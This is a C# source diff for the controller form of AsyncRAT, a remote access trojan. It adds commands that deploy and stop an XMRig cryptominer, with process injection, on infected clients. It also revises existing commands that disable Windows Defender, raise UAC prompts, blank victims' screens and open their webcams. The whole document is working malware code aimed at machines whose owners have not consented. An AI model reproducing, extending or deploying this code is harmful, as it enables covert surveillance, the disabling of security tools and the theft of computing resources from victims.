@@ -35,7 +35,7 @@ namespace Server
         {
             InitializeComponent();
             SetWindowTheme(listView1.Handle, "explorer", null);
-            this.Opacity = 0;    
+            this.Opacity = 0;
             formDOS = new FormDOS
             {
                 Name = "DOS",
@@ -1350,44 +1350,80 @@ namespace Server
 
         private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
         {
-            DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-            if (dialogResult == DialogResult.Yes)
+            if (listView1.SelectedItems.Count > 0)
             {
-                try
+                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                if (dialogResult == DialogResult.Yes)
                 {
-                    MsgPack packet = new MsgPack();
-                    packet.ForcePathObject("Packet").AsString = "uac";
-
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "plugin";
-                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
-                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                    foreach (Clients client in GetSelectedClients())
+                    try
                     {
-                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Packet").AsString = "uac";
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "plugin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                        foreach (Clients client in GetSelectedClients())
                         {
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
+                            {
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
                         }
                     }
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                    return;
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                        return;
+                    }
                 }
             }
         }
 
         private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
         {
-            DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-            if (dialogResult == DialogResult.Yes)
+            if (listView1.SelectedItems.Count > 0)
             {
-                try
+                DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                if (dialogResult == DialogResult.Yes)
+                {
+                    try
+                    {
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Packet").AsString = "disableDefedner";
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "plugin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
+                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                        foreach (Clients client in GetSelectedClients())
+                        {
+                            if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
+                            {
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                        return;
+                    }
+                }
+            }
+        }
+
+        private void BlankScreenToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
                 {
                     MsgPack packet = new MsgPack();
-                    packet.ForcePathObject("Packet").AsString = "disableDefedner";
+                    packet.ForcePathObject("Packet").AsString = "blankscreen";
 
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "plugin";
@@ -1396,36 +1432,8 @@ namespace Server
 
                     foreach (Clients client in GetSelectedClients())
                     {
-                        if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
-                        {
-                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                        }
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message);
-                    return;
-                }
-                { }
-            }
-        }
-
-        private void BlankScreenToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            try
-            {
-                MsgPack packet = new MsgPack();
-                packet.ForcePathObject("Packet").AsString = "blankscreen";
-
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "plugin";
-                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
-                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
-
-                foreach (Clients client in GetSelectedClients())
-                {
-                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
             }
             catch (Exception ex)
@@ -1439,25 +1447,28 @@ namespace Server
         {
             try
             {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "plugin";
-                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\RemoteCamera.dll"));
-
-                foreach (Clients client in GetSelectedClients())
+                if (listView1.SelectedItems.Count > 0)
                 {
-                    FormWebcam remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
-                    if (remoteDesktop == null)
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\RemoteCamera.dll"));
+
+                    foreach (Clients client in GetSelectedClients())
                     {
-                        remoteDesktop = new FormWebcam
+                        FormWebcam remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
+                        if (remoteDesktop == null)
                         {
-                            Name = "Webcam:" + client.ID,
-                            F = this,
-                            Text = "Webcam:" + client.ID,
-                            ParentClient = client,
-                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
-                        };
-                        remoteDesktop.Show();
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            remoteDesktop = new FormWebcam
+                            {
+                                Name = "Webcam:" + client.ID,
+                                F = this,
+                                Text = "Webcam:" + client.ID,
+                                ParentClient = client,
+                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
+                            };
+                            remoteDesktop.Show();
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
                     }
                 }
             }
@@ -1486,7 +1497,91 @@ namespace Server
         //    }
         //}
 
+        private void RunToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    using (FormMiner form = new FormMiner())
+                    {
+                        if (form.ShowDialog() == DialogResult.OK)
+                        {
+                            if (!File.Exists(@"Plugins\xmrig.bin"))
+                            {
+                                File.WriteAllBytes(@"Plugins\xmrig.bin", Properties.Resources.xmrig);
+                            }
+                            MsgPack packet = new MsgPack();
+                            packet.ForcePathObject("Packet").AsString = "xmr";
+                            packet.ForcePathObject("Command").AsString = "run";
+                            XmrSettings.Pool = form.txtPool.Text;
+                            packet.ForcePathObject("Pool").AsString = form.txtPool.Text;
+
+                            XmrSettings.Wallet = form.txtWallet.Text;
+                            packet.ForcePathObject("Wallet").AsString = form.txtWallet.Text;
+
+                            XmrSettings.Pass = form.txtPass.Text;
+                            packet.ForcePathObject("Pass").AsString = form.txtPool.Text;
+
+                            XmrSettings.InjectTo = form.comboInjection.Text;
+                            packet.ForcePathObject("InjectTo").AsString = form.comboInjection.Text;
+
+                            XmrSettings.Hash = GetHash.GetChecksum(@"Plugins\xmrig.bin");
+                            packet.ForcePathObject("Hash").AsString = XmrSettings.Hash;
+
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Packet").AsString = "plugin";
+                            msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
+                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                            foreach (Clients client in GetSelectedClients())
+                            {
+                                client.LV.ForeColor = Color.Red;
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+        private void KillToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Packet").AsString = "xmr";
+                    packet.ForcePathObject("Command").AsString = "stop";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
+                    {
+                        client.LV.ForeColor = Color.Red;
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+
         [DllImport("uxtheme", CharSet = CharSet.Unicode)]
         public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);
+
     }
 }
